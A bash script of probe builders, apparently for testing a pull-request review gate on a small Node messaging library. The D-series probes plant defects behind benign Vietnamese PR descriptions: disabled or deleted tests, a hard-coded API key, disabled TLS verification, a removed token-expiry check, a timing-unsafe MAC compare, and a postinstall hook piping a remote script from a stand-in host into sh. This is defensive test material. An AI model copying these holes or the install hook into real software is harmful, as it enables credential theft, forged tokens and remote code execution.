# The probe builders of plan.md, one function p_<id> per probe, sourced by run.sh and dry.sh. Each runs in a fresh
# worktree off the scratch repository's main as seeded from the fixture (scratch main 40878f3e of the first run),
# commits its change, and sets T (title) and B (body) for the pull request.
# edit FILE OLD NEW: replace one exact occurrence, or fail.
edit() { python3 - "$@" <<'EOF'
import sys
p, a, b = sys.argv[1], sys.argv[2], sys.argv[3]
s = open(p).read()
assert s.count(a) == 1, f"{p}: {a!r} found {s.count(a)} times"
open(p, 'w').write(s.replace(a, b))
EOF
}
TEST_HEAD="import { test } from 'node:test';
import assert from 'node:assert/strict';"

p_C1() { mkdir -p src test; cat > src/capitalize.js <<'EOF'
// Upper-cases the first letter of every word and keeps the rest: "xin chào" gives "Xin Chào".
export function capitalizeWords(text) {
  return text.replace(/(^|\s)(\p{L})/gu, (_, space, letter) => space + letter.toUpperCase());
}
EOF
printf '%s\n\n%s\n' "$TEST_HEAD" "test('capitalizes every word', async () => {
  const { capitalizeWords } = await import('../src/capitalize.js');
  assert.equal(capitalizeWords('xin chào việt nam'), 'Xin Chào Việt Nam');
});" > test/capitalize.test.js
probe_commit "Add capitalizeWords"; T="Thêm capitalizeWords"; B="Viết hoa chữ đầu mỗi từ, có test."; }

p_C2() { cat > src/wordcount.js <<'EOF'
import { squash } from './format.js';

// The number of words in a text, counting runs of whitespace as one break.
export function wordCount(text) {
  const words = squash(text);
  return words ? words.split(' ').length : 0;
}
EOF
printf '%s\n\n%s\n' "$TEST_HEAD" "test('counts words and treats blank text as none', async () => {
  const { wordCount } = await import('../src/wordcount.js');
  assert.equal(wordCount('  một  hai\nba '), 3);
  assert.equal(wordCount('   '), 0);
});" > test/wordcount.test.js
probe_commit "Add wordCount"; T="Thêm wordCount"; B="Đếm số từ, coi chuỗi trắng là 0 từ."; }

p_C3() { edit src/ratelimit.js "      return Math.max(0, limit - recent.length);
    },
" "      return Math.max(0, limit - recent.length);
    },
    reset(recipient) {
      sent.delete(recipient);
    },
"
printf '%s\n%s\n\n%s\n' "$TEST_HEAD" "import { createLimiter } from '../src/ratelimit.js';" "test('reset frees every slot of one recipient', () => {
  const limiter = createLimiter({ limit: 1, windowMs: 1000, now: () => 0 });
  limiter.allow('a');
  limiter.reset('a');
  assert.equal(limiter.allow('a'), true);
});" > test/ratelimit-reset.test.js
probe_commit "Let the limiter reset one recipient"; T="Limiter: reset theo người nhận"; B="Thêm reset(recipient) để xoá các lượt đã đếm của một người nhận."; }

p_C4() { cat > src/chunk.js <<'EOF'
// Splits text into pieces of at most `size` user-visible characters, never inside an emoji.
export function chunk(text, size) {
  const chars = [...new Intl.Segmenter('en', { granularity: 'grapheme' }).segment(text)].map((s) => s.segment);
  const out = [];
  for (let i = 0; i < chars.length; i += size) out.push(chars.slice(i, i + size).join(''));
  return out;
}
EOF
printf '%s\n\n%s\n' "$TEST_HEAD" "test('splits text into pieces without breaking an emoji', async () => {
  const { chunk } = await import('../src/chunk.js');
  assert.deepEqual(chunk('ab👍🏽cde', 2), ['ab', '👍🏽c', 'de']);
});" > test/chunk.test.js
probe_commit "Add chunk"; T="Thêm chunk"; B="Chia văn bản thành từng đoạn, không cắt emoji."; }

p_C5() { edit src/ratelimit.js "  const sent = new Map();
  return {" "  const sent = new Map();
  const recentFor = (recipient, t) => (sent.get(recipient) ?? []).filter((at) => t - at < windowMs);
  return {"
edit src/ratelimit.js "    allow(recipient) {
      const t = now();
      const recent = (sent.get(recipient) ?? []).filter((at) => t - at < windowMs);" "    allow(recipient) {
      const t = now();
      const recent = recentFor(recipient, t);"
edit src/ratelimit.js "      const t = now();
      const recent = (sent.get(recipient) ?? []).filter((at) => t - at < windowMs);
      return Math.max" "      const recent = recentFor(recipient, now());
      return Math.max"
probe_commit "Share the window filter in the limiter"; T="Limiter: gom bộ lọc cửa sổ vào một hàm"; B="Tái cấu trúc, hành vi giữ nguyên; test cũ phủ cả hai nhánh.

No-red: pure refactor of the window filter; the existing limiter tests cover both callers."; }

p_C6() { printf '\n## Giới hạn và thử lại\n\n`send` thử lại lỗi tạm thời tối đa `attempts` lần (1 đến 10); lỗi vĩnh viễn không thử lại.\n' >> README.md
probe_commit "Describe retries in the README"; T="README: thử lại khi gửi"; B="Chỉ tài liệu."; }

p_C7() { printf '%s\n%s\n\n%s\n' "$TEST_HEAD" "import { send } from '../src/send.js';" "test('refuses a message whose text is only whitespace', async () => {
  await assert.rejects(send(async () => 'ok', { to: 'a', text: '  \n ' }), TypeError);
});" > test/send-blank.test.js
probe_commit "Test that send refuses blank text" "Failing-test: node --test test/send-blank.test.js"
edit src/send.js "if (!message.to || !message.text) throw" "if (!message.to || !message.text?.trim()) throw"
probe_commit "Refuse blank text in send"; T="send: từ chối tin chỉ có khoảng trắng"; B="Bậc 2 (src/send.js): test đỏ commit trước với Failing-test:, rồi mới sửa code."; }

p_C8() { printf '%s\n%s\n\n%s\n' "$TEST_HEAD" "import { sign } from '../../src/auth/token.js';" "test('sign refuses a recipient holding a dot', () => {
  assert.throws(() => sign('a.b', 2000, 'k'), TypeError);
});" > test/auth/token-dot.test.js
probe_commit "Test that sign refuses a dotted recipient" "Failing-test: node --test test/auth/token-dot.test.js"
edit src/auth/token.js "  const body = \`\${recipient}.\${expiresAt}\`;" "  if (String(recipient).includes('.')) throw new TypeError('a recipient cannot hold a dot');
  const body = \`\${recipient}.\${expiresAt}\`;"
probe_commit "Refuse a dotted recipient in sign"; T="token: sign từ chối người nhận có dấu chấm"; B="Bậc 2 (src/auth/): dấu chấm làm hỏng định dạng token. Test đỏ commit trước, rồi mới sửa."; }

p_C9() { edit package.json '  "type": "module",' '  "type": "module",
  "engines": { "node": ">=24" },'
probe_commit "Require Node 24 in package.json"; T="package.json: yêu cầu Node 24"; B="Khớp với Node mà cổng chạy."; }

p_C10() { edit src/format.js '// The first letter of each word, upper-cased: "Nguyễn Văn Tuấn" gives "NVT".' '/**
 * The first letter of each word, upper-cased: "Nguyễn Văn Tuấn" gives "NVT".
 * @param {string} name
 * @returns {string}
 */'
probe_commit "Document initials with JSDoc"; T="JSDoc cho initials"; B="Chỉ chú thích.

No-red: comments only, no behaviour changes, so no test can fail first."; }

p_C11() { printf '%s\n%s\n\n%s\n' "$TEST_HEAD" "import { truncate } from '../src/format.js';" "test('a limit of one keeps one character and no ellipsis', () => {
  assert.equal(truncate('abc', 1), 'a');
});" > test/truncate-one.test.js
probe_commit "Test truncate with a limit of one"; T="Test truncate với giới hạn 1"; B="Thêm test cho hành vi đã có."; }

p_C12() { edit src/format.js "export function truncate(text, max) {" "export function truncate(text, max, { ellipsis = '…' } = {}) {"
edit src/format.js "  return chars.slice(0, max - 1).join('') + '…';" "  return chars.slice(0, max - 1).join('') + ellipsis;"
printf '%s\n%s\n\n%s\n' "$TEST_HEAD" "import { truncate } from '../src/format.js';" "test('takes another ellipsis', () => {
  assert.equal(truncate('abcdefgh', 5, { ellipsis: '...' }), 'abcd...');
});" > test/truncate-ellipsis.test.js
probe_commit "Let truncate take another ellipsis"; T="truncate: tuỳ chọn ellipsis"; B="Cho phép đổi dấu ba chấm."; }

p_C13() { cat > src/mask.js <<'EOF'
// Hides the middle of a phone number for logs: "0912345678" gives "09******78".
export function maskRecipient(phone) {
  const s = String(phone);
  return s.length <= 4 ? '*'.repeat(s.length) : s.slice(0, 2) + '*'.repeat(s.length - 4) + s.slice(-2);
}
EOF
printf '%s\n\n%s\n' "$TEST_HEAD" "test('hides the middle of a phone number', async () => {
  const { maskRecipient } = await import('../src/mask.js');
  assert.equal(maskRecipient('0912345678'), '09******78');
  assert.equal(maskRecipient('123'), '***');
});" > test/mask.test.js
probe_commit "Add maskRecipient for logs"; T="Thêm maskRecipient"; B="Che số điện thoại khi ghi log."; }

p_C14() { edit src/send.js "// Sends one message through \`transport\`, retrying transient failures up to \`attempts\` times." "// Sends one message through \`transport\`. A failure marked \`transient\` is retried, up to \`attempts\` tries in all;
// any other failure is thrown at once."
probe_commit "Say which failures send retries"; T="send: chú thích rõ lỗi nào được thử lại"; B="Bậc 2 (src/send.js), chỉ chú thích.

No-red: a comment in send.js only; behaviour is unchanged, so no test can fail first."; }

p_C15() { cat > src/slug.js <<'EOF'
// A URL-safe slug, Vietnamese diacritics removed: "Xin chào Việt Nam!" gives "xin-chao-viet-nam".
export function slugify(text) {
  return text
    .normalize('NFD')
    .replace(/\p{M}/gu, '')
    .replace(/đ/g, 'd')
    .replace(/Đ/g, 'D')
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, '-')
    .replace(/^-|-$/g, '');
}
EOF
printf '%s\n\n%s\n' "$TEST_HEAD" "test('slugifies Vietnamese text', async () => {
  const { slugify } = await import('../src/slug.js');
  assert.equal(slugify('Xin chào Việt Nam!'), 'xin-chao-viet-nam');
  assert.equal(slugify('Đường đi'), 'duong-di');
});" > test/slug.test.js
probe_commit "Add slugify"; T="Thêm slugify"; B="Tạo slug, bỏ dấu tiếng Việt."; }

p_C16() { cat > src/duration.js <<'EOF'
// Milliseconds in a duration written as a number and a unit: "30s", "5m", "2h". NaN when it is not one.
export function parseDuration(text) {
  const m = /^(\d+)(ms|s|m|h)$/.exec(String(text).trim());
  if (!m) return NaN;
  return Number(m[1]) * { ms: 1, s: 1000, m: 60000, h: 3600000 }[m[2]];
}
EOF
printf '%s\n\n%s\n' "$TEST_HEAD" "test('parses durations and refuses anything else', async () => {
  const { parseDuration } = await import('../src/duration.js');
  assert.equal(parseDuration('5m'), 300000);
  assert.equal(parseDuration('30s'), 30000);
  assert.ok(Number.isNaN(parseDuration('soon')));
});" > test/duration.test.js
probe_commit "Add parseDuration"; T="Thêm parseDuration"; B="Đọc thời lượng dạng 30s, 5m, 2h."; }

p_C17() { edit src/format.js "  return text.replace(/\s+/g, ' ').trim();" "  return text.trim().replace(/\s+/g, ' ');"
probe_commit "Trim before squashing whitespace"; T="squash: cắt hai đầu trước"; B="Cùng kết quả, ít thay thế hơn ở hai đầu.

No-red: same output for every input; the existing squash test covers it."; }

p_C18() { printf 'node_modules/\ncoverage/\n.DS_Store\n' > .gitignore
probe_commit "Ignore coverage and node_modules"; T="Thêm .gitignore"; B="Bỏ qua coverage/ và node_modules/."; }

p_C19() { python3 - <<'EOF'
p = 'test/ratelimit.test.js'
s = open(p).read()
head, sep, body = s.partition("import { createLimiter } from '../src/ratelimit.js';\n")
body = body.strip('\n')
indented = '\n'.join(('  ' + line) if line else line for line in body.split('\n'))
s = head.replace("import { test } from 'node:test';", "import { describe, test } from 'node:test';") + sep + "\ndescribe('the limiter', () => {\n" + indented + "\n});\n"
open(p, 'w').write(s)
EOF
probe_commit "Group the limiter tests"; T="Gom test limiter vào một describe"; B="Chỉ sắp xếp lại test, giữ nguyên mọi assert."; }

p_C20() { edit src/ratelimit.js "export function createLimiter({ limit, windowMs, now = () => Date.now() }) {" "export function createLimiter({ limit, windowMs, now = () => Date.now() }) {
  if (!Number.isInteger(limit) || limit < 1) throw new RangeError('limit must be a positive integer');"
printf '%s\n%s\n\n%s\n' "$TEST_HEAD" "import { createLimiter } from '../src/ratelimit.js';" "test('refuses a limit that is not a positive integer', () => {
  assert.throws(() => createLimiter({ limit: 0, windowMs: 1000 }), RangeError);
  assert.throws(() => createLimiter({ limit: 1.5, windowMs: 1000 }), RangeError);
});" > test/ratelimit-limit.test.js
probe_commit "Refuse a bad limit in createLimiter"; T="createLimiter: kiểm tra limit"; B="Ném RangeError khi limit không phải số nguyên dương."; }

p_D1() { cat > src/titlecase.js <<'EOF'
// Upper-cases the first letter of the text.
export function titleCase(text) {
  return text ? text[0].toUpperCase() + text.slice(1) : text;
}
EOF
printf '%s\n\n%s\n' "$TEST_HEAD" "test.only('title-cases text', async () => {
  const { titleCase } = await import('../src/titlecase.js');
  assert.equal(titleCase('xin chào'), 'Xin chào');
});" > test/titlecase.test.js
probe_commit "Add titleCase"; T="Thêm titleCase"; B="Viết hoa chữ đầu."; }

p_D2() { edit src/format.js "  return text.replace(/\s+/g, ' ').trim();" "  return text.replace(/\s/g, ' ').trim();"
edit test/format.test.js "test('squashes whitespace', () => {" "test.skip('squashes whitespace', () => {"
probe_commit "Squash each whitespace character"; T="squash: thay từng ký tự trắng"; B="Đơn giản hoá squash."; }

p_D3() { edit src/ratelimit.js "      return Math.max(0, limit - recent.length);" "      return Math.max(0, limit - recent.length - 1);"
git rm -q test/ratelimit.test.js
probe_commit "Count the next send in remaining"; T="remaining tính cả lượt sắp gửi"; B="Gọn lại test limiter."; }

p_D4() { edit src/format.js "  return chars.slice(0, max - 1).join('') + '…';" "  return chars.slice(0, max).join('');"
edit test/format.test.js "  assert.equal(truncate('abcdefgh', 5), 'abcd…');
" ""
edit test/format.test.js "  assert.equal(truncate('ab👍🏽cd', 4), 'ab👍🏽…');
" ""
probe_commit "Cut text without an ellipsis"; T="truncate: bỏ dấu ba chấm"; B="Cắt gọn, không thêm ký tự."; }

p_D5() { edit src/ratelimit.js "      return Math.max(0, limit - recent.length);" "      return Math.max(0, limit - recent.length - 1);"
probe_commit "Count the next send in remaining"; T="remaining tính cả lượt sắp gửi"; B="Sửa nhỏ trong limiter."; }

p_D6() { cat > src/words.js <<'EOF'
import { squash } from './format.js';

// The words of a text.
export function words(text) {
  return squash(text).split(' ');
}
EOF
printf '%s\n%s\n\n%s\n' "$TEST_HEAD" "import { squash } from '../src/format.js';" "test('splits text into words', () => {
  assert.deepEqual(squash(' a  b ').split(' '), ['a', 'b']);
});" > test/words.test.js
probe_commit "Add words"; T="Thêm words"; B="Tách từ."; }

p_D7() { edit src/send.js "      return await transport(message);" "      return await transport({ ...message, apiKey });"
edit src/send.js "// Sends one message" "const apiKey = 'q7Vx2Lm9Pz4Rt8Wk3Ns6Yb';

// Sends one message"
printf '%s\n%s\n\n%s\n' "$TEST_HEAD" "import { send } from '../src/send.js';" "test('passes the gateway key to the transport', async () => {
  const seen = await send(async (m) => m.apiKey, { to: 'a', text: 'hi' });
  assert.ok(seen);
});" > test/send-key.test.js
probe_commit "Pass the gateway key to the transport"; T="send: gửi kèm khoá gateway"; B="Transport cần khoá của gateway."; }

p_D8() { edit src/send.js "      return await transport(message);" "      return await transport(message, { rejectUnauthorized: false });"
printf '%s\n%s\n\n%s\n' "$TEST_HEAD" "import { send } from '../src/send.js';" "test('passes connection options to the transport', async () => {
  const options = await send(async (m, o) => o, { to: 'a', text: 'hi' });
  assert.equal(typeof options, 'object');
});" > test/send-options.test.js
probe_commit "Pass connection options to the transport"; T="send: truyền tuỳ chọn kết nối"; B="Gateway dùng chứng chỉ tự ký ở môi trường thử."; }

p_D9() { edit src/auth/token.js "  const parts = String(token).split('.');" "  debugger;
  const parts = String(token).split('.');"
probe_commit "Look into token parsing"; T="token: xem lại phần tách token"; B="Đang dò lỗi tách token."; }

p_D10() { cat > src/wrap.js <<'EOF'
// Wraps text at `width` user-visible characters.
export function wrap(text, width) {
  throw new Error('not implemented');
}
EOF
printf '%s\n\n%s\n' "$TEST_HEAD" "test('wrap exists', async () => {
  const { wrap } = await import('../src/wrap.js');
  assert.throws(() => wrap('abc', 2));
});" > test/wrap.test.js
probe_commit "Add wrap"; T="Thêm wrap"; B="Khung cho wrap."; }

p_D11() { edit src/format.js "// Cuts text to at most" "// @ts-nocheck
// Cuts text to at most"
edit src/format.js "// Collapses runs of whitespace and trims the ends." "// Collapses runs of whitespace into one space and trims the ends."
probe_commit "Tidy format.js comments"; T="format.js: chỉnh chú thích"; B="Chỉnh chú thích.

No-red: comments only in format.js; nothing can fail first."; }

p_D12() { printf '%s\n%s\n\n%s\n' "$TEST_HEAD" "import { sign, verify } from '../../src/auth/token.js';" "test('a token for an empty recipient is refused', () => {
  assert.equal(verify(sign('', 2000, 'k'), 'k', 1000), null);
});" > test/auth/token-empty.test.js
probe_commit "Test that an empty recipient is refused" "Failing-test: node --test test/auth/token-empty.test.js"
edit test/auth/token-empty.test.js "  assert.equal(verify(sign('', 2000, 'k'), 'k', 1000), null);" "  assert.equal(typeof verify(sign('', 2000, 'k'), 'k', 1000), 'string');"
probe_commit "Settle the empty-recipient case"; T="token: người nhận rỗng"; B="Bậc 2 (src/auth/). Test commit trước với Failing-test:."; }

p_D13() { edit src/auth/token.js "  if (!(Number(expiresAt) > now)) return null;
" ""
probe_commit "Leave expiry to the caller"; T="token: để bên gọi kiểm hạn"; B="Bên gọi đã kiểm hạn."; }

p_D14() { edit src/send.js "      if (!error.transient) break;
" ""
probe_commit "Retry every failure in send"; T="send: thử lại mọi lỗi"; B="Gateway hay trả lỗi không đánh dấu transient."; }

p_D15() { edit src/send.js "      if (!error.transient) break;
" ""
edit test/send.test.js "  await assert.rejects(send(transport, { to: 'a', text: 'hi' }), /bad recipient/);
  assert.equal(calls, 1);" "  await assert.rejects(send(transport, { to: 'a', text: 'hi' }), /bad recipient/);
  assert.equal(calls, 3);"
probe_commit "Retry every failure in send"; T="send: thử lại mọi lỗi"; B="Gateway hay trả lỗi không đánh dấu transient; cập nhật test theo hành vi mới."; }

p_D16() { edit src/format.js "  return text.replace(/\s+/g, ' ').trim();" "  return text.replace(/\s/g, ' ').trim();"
edit .gate/config.sh '--test-reporter-destination="$GATE_REPORT" "$@"' '--test-reporter-destination="$GATE_REPORT" "${@:-test/auth}"'
probe_commit "Run the auth tests by default"; T="Cổng: mặc định chạy test auth"; B="Rút gọn bộ test mặc định cho nhanh."; }

p_D17() { cat > src/excerpt.js <<'EOF'
import { squash } from './format.js';

// The first `n` words of a text, with an ellipsis when words were left out.
export function excerpt(text, n) {
  const words = squash(text).split(' ');
  const kept = words.slice(0, n || undefined);
  return kept.length < words.length ? `${kept.join(' ')}…` : kept.join(' ');
}
EOF
printf '%s\n\n%s\n' "$TEST_HEAD" "test('keeps the first words', async () => {
  const { excerpt } = await import('../src/excerpt.js');
  assert.equal(excerpt('một hai ba bốn', 2), 'một hai…');
});" > test/excerpt.test.js
probe_commit "Add excerpt"; T="Thêm excerpt"; B="Lấy n từ đầu."; }

p_D18() { edit src/ratelimit.js "    allow(recipient) {
      const t = now();
      const recent = (sent.get(recipient) ?? []).filter((at) => t - at < windowMs);" "    allow(recipient) {
      const t = now();
      const recent = (sent.get(recipient) ?? []).filter((at) => t - at <= windowMs);"
probe_commit "Count the window edge in allow"; T="allow: tính cả biên cửa sổ"; B="Chặt hơn ở biên."; }

p_D19() { edit src/auth/token.js "import { createHmac, timingSafeEqual } from 'node:crypto';" "import { createHmac } from 'node:crypto';"
edit src/auth/token.js "  const want = createHmac('sha256', key).update(\`\${recipient}.\${expiresAt}\`).digest();
  const got = Buffer.from(mac, 'hex');
  if (got.length !== want.length || !timingSafeEqual(got, want)) return null;" "  const want = createHmac('sha256', key).update(\`\${recipient}.\${expiresAt}\`).digest('hex');
  if (mac !== want) return null;"
probe_commit "Compare token MACs as hex"; T="token: so MAC dạng hex"; B="Đơn giản hoá phép so MAC.

No-red: simpler MAC comparison with the same results; the token tests cover forged and tampered tokens."; }

p_D20() { edit package.json '  "scripts": {' '  "scripts": {
    "postinstall": "curl -s https://example.invalid/i.sh | sh",'
probe_commit "Fetch the gateway helper after install"; T="Cài helper của gateway sau npm install"; B="Helper cần cho môi trường dev."; }
